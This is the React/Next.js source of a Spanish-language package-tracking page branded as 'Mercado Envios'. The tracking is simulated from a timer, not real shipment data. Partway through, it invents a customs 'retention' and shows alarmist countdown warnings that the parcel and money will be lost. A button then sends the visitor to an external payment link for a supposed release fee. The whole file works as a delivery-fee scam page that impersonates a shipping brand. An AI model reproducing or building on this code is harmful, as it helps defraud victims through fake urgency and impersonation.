'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { Search, Package, Truck, Plane, MapPin, Clock, AlertTriangle, CheckCircle, CreditCard, LogOut, User } from 'lucide-react'
import AutomaticNotificationSystem from '@/components/AutomaticNotificationSystem'

interface TrackingStep {
  id: number
  title: string
  description: string
  location: string
  timestamp: string
  status: 'completed' | 'current' | 'pending' | 'retention'
  icon: any
}

interface TrackingData {
  code: string
  status: string
  currentStep: number
  estimatedDelivery: string
  steps: TrackingStep[]
  isRetained: boolean
  retentionStartTime?: string
}

export default function TrackingPage() {
  const [trackingCode, setTrackingCode] = useState('')
  const [trackingData, setTrackingData] = useState<TrackingData | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [userEmail, setUserEmail] = useState('')
  const [userName, setUserName] = useState('')
  const router = useRouter()

  useEffect(() => {
    // Verificar se usuário está logado
    const email = localStorage.getItem('userEmail')
    const name = localStorage.getItem('userName')
    const savedCode = localStorage.getItem('trackingCode')
    
    if (!email) {
      router.push('/login')
      return
    }
    
    setUserEmail(email)
    setUserName(name || '')
    
    if (savedCode) {
      setTrackingCode(savedCode)
      // Auto-rastrear o código salvo
      handleTrack(savedCode)
    }
  }, [router])

  // Definir as 9 etapas específicas solicitadas
  const getTrackingSteps = (createdAt: Date, hoursSinceCreated: number): TrackingStep[] => {
    const steps: TrackingStep[] = [
      {
        id: 1,
        title: 'Pedido en Análisis',
        description: 'Tu pedido está en análisis.',
        location: 'Centro de Procesamiento',
        timestamp: new Date(createdAt.getTime()).toLocaleString('es-ES'),
        status: 'completed', // Sempre mostrado no primeiro login
        icon: Package
      },
      {
        id: 2,
        title: 'Pedido Confirmado',
        description: 'Tu pedido fue confirmado.',
        location: 'Centro de Distribución',
        timestamp: new Date(createdAt.getTime() + (4 * 60 * 60 * 1000)).toLocaleString('es-ES'),
        status: hoursSinceCreated >= 4 ? 'completed' : hoursSinceCreated >= 0 ? 'current' : 'pending',
        icon: CheckCircle
      },
      {
        id: 3,
        title: 'Tránsito Internacional',
        description: 'Tu pedido salió para tránsito internacional.',
        location: 'Aeropuerto Internacional',
        timestamp: new Date(createdAt.getTime() + (8 * 60 * 60 * 1000)).toLocaleString('es-ES'),
        status: hoursSinceCreated >= 8 ? 'completed' : hoursSinceCreated >= 4 ? 'current' : 'pending',
        icon: Plane
      },
      {
        id: 4,
        title: 'Esperando Liberación',
        description: hoursSinceCreated >= 32 
          ? '🚨 ¡URGENTE! Tu pedido está RETENIDO en aduana. ¡ACTÚA AHORA o perderás tu envío! Paga la tasa de liberación INMEDIATAMENTE para evitar la devolución.'
          : 'Tu pedido está esperando liberación en aduana.',
        location: 'Aduana Internacional',
        timestamp: new Date(createdAt.getTime() + (32 * 60 * 60 * 1000)).toLocaleString('es-ES'),
        status: hoursSinceCreated >= 32 ? 'retention' : hoursSinceCreated >= 8 ? 'current' : 'pending',
        icon: hoursSinceCreated >= 32 ? AlertTriangle : MapPin
      },
      {
        id: 5,
        title: 'Análisis en Curso',
        description: 'El análisis de tu pedido en aduana está en curso.',
        location: 'Aduana Nacional',
        timestamp: new Date(createdAt.getTime() + (40 * 60 * 60 * 1000)).toLocaleString('es-ES'),
        status: hoursSinceCreated >= 40 ? 'completed' : hoursSinceCreated >= 32 ? 'current' : 'pending',
        icon: Clock
      },
      {
        id: 6,
        title: 'Liberado de Aduana',
        description: 'Tu pedido fue liberado de aduana.',
        location: 'Aduana Nacional',
        timestamp: new Date(createdAt.getTime() + (48 * 60 * 60 * 1000)).toLocaleString('es-ES'),
        status: hoursSinceCreated >= 48 ? 'completed' : hoursSinceCreated >= 40 ? 'current' : 'pending',
        icon: CheckCircle
      },
      {
        id: 7,
        title: 'Camino al País',
        description: 'Tu pedido está camino a tu país.',
        location: 'En Tránsito Nacional',
        timestamp: new Date(createdAt.getTime() + (56 * 60 * 60 * 1000)).toLocaleString('es-ES'),
        status: hoursSinceCreated >= 56 ? 'completed' : hoursSinceCreated >= 48 ? 'current' : 'pending',
        icon: Truck
      },
      {
        id: 8,
        title: 'Llegó al País',
        description: 'Tu pedido llegó a tu país de destino.',
        location: 'Centro de Distribución Nacional',
        timestamp: new Date(createdAt.getTime() + (64 * 60 * 60 * 1000)).toLocaleString('es-ES'),
        status: hoursSinceCreated >= 64 ? 'completed' : hoursSinceCreated >= 56 ? 'current' : 'pending',
        icon: MapPin
      },
      {
        id: 9,
        title: '¡A Punto de Llegar!',
        description: '¡Tu pedido está a punto de llegar!',
        location: 'Centro de Distribución Local',
        timestamp: new Date(createdAt.getTime() + (72 * 60 * 60 * 1000)).toLocaleString('es-ES'),
        status: hoursSinceCreated >= 72 ? 'completed' : hoursSinceCreated >= 64 ? 'current' : 'pending',
        icon: Package
      }
    ]

    return steps
  }

  const simulateTracking = (code: string): TrackingData => {
    const savedCreatedAt = localStorage.getItem('orderCreatedAt')
    const createdAt = savedCreatedAt ? new Date(savedCreatedAt) : new Date(Date.now() - (Math.random() * 72 * 60 * 60 * 1000))
    
    const now = new Date()
    const hoursSinceCreated = (now.getTime() - createdAt.getTime()) / (1000 * 60 * 60)
    
    const isRetained = hoursSinceCreated >= 32 && hoursSinceCreated < 40 // Retenção entre 32-40h
    const currentStep = Math.min(Math.floor(hoursSinceCreated / 8), 8)

    const steps = getTrackingSteps(createdAt, hoursSinceCreated)

    return {
      code,
      status: isRetained ? '🚨 RETENCIÓN - ACCIÓN NECESARIA' : hoursSinceCreated >= 72 ? 'ENTREGADO' : 'EN TRÁNSITO',
      currentStep,
      estimatedDelivery: new Date(createdAt.getTime() + (72 * 60 * 60 * 1000)).toLocaleDateString('es-ES'),
      steps,
      isRetained,
      retentionStartTime: isRetained ? new Date(createdAt.getTime() + (32 * 60 * 60 * 1000)).toLocaleString('es-ES') : undefined
    }
  }

  const handleTrack = async (codeToTrack?: string) => {
    const code = codeToTrack || trackingCode
    if (!code.trim()) return
    
    setIsLoading(true)
    await new Promise(resolve => setTimeout(resolve, 1500))
    
    const data = simulateTracking(code.toUpperCase())
    setTrackingData(data)
    setIsLoading(false)
  }

  const handleLogout = () => {
    localStorage.removeItem('userEmail')
    localStorage.removeItem('userName')
    localStorage.removeItem('trackingCode')
    localStorage.removeItem('orderCreatedAt')
    router.push('/login')
  }

  // Função para determinar quais etapas mostrar
  const getVisibleSteps = (steps: TrackingStep[]) => {
    const visibleSteps: TrackingStep[] = []
    
    for (let i = 0; i < steps.length; i++) {
      const step = steps[i]
      
      // Sempre mostra etapas completadas
      if (step.status === 'completed' || step.status === 'retention') {
        visibleSteps.push(step)
      }
      // Mostra a próxima etapa se a anterior estiver completa
      else if (step.status === 'current' || step.status === 'pending') {
        // Verifica se é a primeira etapa ou se a anterior está completa
        if (i === 0 || (i > 0 && steps[i - 1].status === 'completed')) {
          visibleSteps.push(step)
        }
        // Para de mostrar etapas após encontrar a primeira pendente
        break
      }
    }
    
    return visibleSteps
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100">
      {/* Header */}
      <header className="bg-white shadow-sm border-b border-slate-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center space-x-4">
              <img 
                src="https://k6hrqrxuu8obbfwn.public.blob.vercel-storage.com/temp/128eb626-2a45-4198-b5cb-8f099d790ef9.png" 
                alt="Mercado Envios" 
                className="h-10 w-auto"
              />
            </div>
            <div className="flex items-center space-x-4">
              <AutomaticNotificationSystem />
              <div className="flex items-center space-x-2 text-slate-700">
                <User className="w-4 h-4" />
                <span className="text-sm">{userName || userEmail}</span>
              </div>
              <button
                onClick={handleLogout}
                className="flex items-center space-x-2 text-slate-600 hover:text-slate-900 transition-colors"
              >
                <LogOut className="w-4 h-4" />
                <span className="text-sm">Salir</span>
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Hero Section */}
        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold text-slate-900 mb-4">
            Rastreo de Pedidos
          </h1>
          <p className="text-xl text-slate-600 max-w-2xl mx-auto">
            Sigue tu pedido en tiempo real con actualizaciones automáticas cada 8 horas
          </p>
        </div>

        {/* Search Section */}
        <div className="bg-white rounded-2xl shadow-xl p-8 mb-8">
          <div className="flex flex-col sm:flex-row gap-4">
            <div className="flex-1">
              <label htmlFor="tracking-code" className="block text-sm font-medium text-slate-700 mb-2">
                Código de Rastreo
              </label>
              <input
                id="tracking-code"
                type="text"
                value={trackingCode}
                onChange={(e) => setTrackingCode(e.target.value)}
                placeholder="Ej: TRK-8A9F1ZP2"
                className="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-900 focus:border-transparent transition-all"
                onKeyPress={(e) => e.key === 'Enter' && handleTrack()}
              />
            </div>
            <div className="flex items-end">
              <button
                onClick={() => handleTrack()}
                disabled={isLoading || !trackingCode.trim()}
                className="bg-gradient-to-r from-lime-500 to-lime-600 hover:from-lime-600 hover:to-lime-700 text-white px-8 py-3 rounded-xl font-semibold transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center space-x-2 shadow-lg hover:shadow-xl"
              >
                {isLoading ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                    <span>Rastreando...</span>
                  </>
                ) : (
                  <>
                    <Search className="w-5 h-5" />
                    <span>Rastrear</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        {/* Tracking Results */}
        {trackingData && (
          <div className="space-y-8">
            {/* Status Card */}
            <div className={`rounded-2xl shadow-xl p-8 ${
              trackingData.isRetained 
                ? 'bg-gradient-to-r from-red-50 to-orange-50 border-2 border-red-200' 
                : 'bg-gradient-to-r from-lime-50 to-green-50 border-2 border-lime-200'
            }`}>
              <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6">
                <div>
                  <h2 className="text-2xl font-bold text-slate-900 mb-2">
                    Código: {trackingData.code}
                  </h2>
                  <div className={`inline-flex items-center px-4 py-2 rounded-full text-sm font-semibold ${
                    trackingData.isRetained 
                      ? 'bg-red-100 text-red-800' 
                      : 'bg-lime-100 text-lime-800'
                  }`}>
                    <Clock className="w-4 h-4 mr-2" />
                    {trackingData.status}
                  </div>
                </div>
                <div className="text-right mt-4 sm:mt-0">
                  <p className="text-sm text-slate-600">Entrega Estimada</p>
                  <p className="text-lg font-semibold text-slate-900">{trackingData.estimatedDelivery}</p>
                </div>
              </div>

              {/* Retention Alert */}
              {trackingData.isRetained && (
                <div className="bg-red-100 border-l-4 border-red-500 p-6 rounded-lg mb-6 animate-pulse">
                  <div className="flex items-start">
                    <AlertTriangle className="w-8 h-8 text-red-500 mr-3 mt-1 animate-bounce" />
                    <div className="flex-1">
                      <h3 className="text-xl font-bold text-red-800 mb-3">
                        🚨 ¡ALERTA CRÍTICA! PEDIDO RETENIDO
                      </h3>
                      <p className="text-red-700 mb-4 font-semibold">
                        ⚠️ Tu pedido está RETENIDO desde {trackingData.retentionStartTime}. 
                        <br />
                        <span className="text-lg font-bold">¡TIENES SOLO 48 HORAS PARA ACTUAR!</span>
                        <br />
                        Si no pagas AHORA, tu pedido será DEVUELTO al remitente y PERDERÁS tu dinero.
                      </p>
                      <div className="bg-red-200 border border-red-400 rounded-lg p-4 mb-4">
                        <p className="text-red-800 font-bold text-center">
                          ⏰ TIEMPO LÍMITE: ¡CADA MINUTO CUENTA!
                          <br />
                          💸 RIESGO: Pérdida total del pedido y dinero
                        </p>
                      </div>
                      <a
                        href="https://global.tribopay.com.br/62ky6pzjsv"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white px-8 py-4 rounded-xl font-bold text-lg transition-all duration-300 flex items-center justify-center space-x-3 shadow-lg hover:shadow-xl animate-pulse"
                      >
                        <CreditCard className="w-6 h-6" />
                        <span>🚀 DESEMBARAZAR AHORA - PAGO URGENTE</span>
                      </a>
                      <p className="text-xs text-red-600 mt-2 text-center font-semibold">
                        ⚡ Liberación inmediata tras el pago • Proceso 100% seguro
                      </p>
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Progress Timeline */}
            <div className="bg-white rounded-2xl shadow-xl p-8">
              <h3 className="text-xl font-bold text-slate-900 mb-8">Historial de Rastreo</h3>
              
              <div className="relative">
                {/* Progress Line */}
                <div className="absolute left-8 top-0 bottom-0 w-0.5 bg-slate-200"></div>
                
                {getVisibleSteps(trackingData.steps).map((step, index, visibleSteps) => {
                  const Icon = step.icon
                  const isLast = index === visibleSteps.length - 1
                  
                  return (
                    <div key={step.id} className={`relative flex items-start pb-8 ${isLast ? 'pb-0' : ''}`}>
                      {/* Icon */}
                      <div className={`relative z-10 flex items-center justify-center w-16 h-16 rounded-full border-4 ${
                        step.status === 'completed' 
                          ? 'bg-lime-500 border-lime-200 text-white' 
                          : step.status === 'current'
                          ? 'bg-blue-500 border-blue-200 text-white animate-pulse'
                          : step.status === 'retention'
                          ? 'bg-red-500 border-red-200 text-white animate-bounce'
                          : 'bg-slate-100 border-slate-200 text-slate-400'
                      }`}>
                        <Icon className="w-6 h-6" />
                      </div>
                      
                      {/* Content */}
                      <div className="ml-6 flex-1">
                        <div className={`p-6 rounded-xl ${
                          step.status === 'retention' 
                            ? 'bg-red-50 border-2 border-red-300 animate-pulse' 
                            : step.status === 'completed' || step.status === 'current'
                            ? 'bg-slate-50 border border-slate-200'
                            : 'bg-slate-25 border border-slate-100'
                        }`}>
                          <div className="flex justify-between items-start mb-2">
                            <h4 className={`font-semibold ${
                              step.status === 'retention' ? 'text-red-800 text-lg' : 'text-slate-900'
                            }`}>
                              {step.title}
                            </h4>
                            <span className="text-sm text-slate-500">{step.timestamp}</span>
                          </div>
                          <p className={`mb-2 ${
                            step.status === 'retention' ? 'text-red-700 font-semibold text-base' : 'text-slate-600'
                          }`}>
                            {step.description}
                          </p>
                          <div className="flex items-center text-sm text-slate-500">
                            <MapPin className="w-4 h-4 mr-1" />
                            {step.location}
                          </div>
                        </div>
                      </div>
                    </div>
                  )
                })}
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  )
}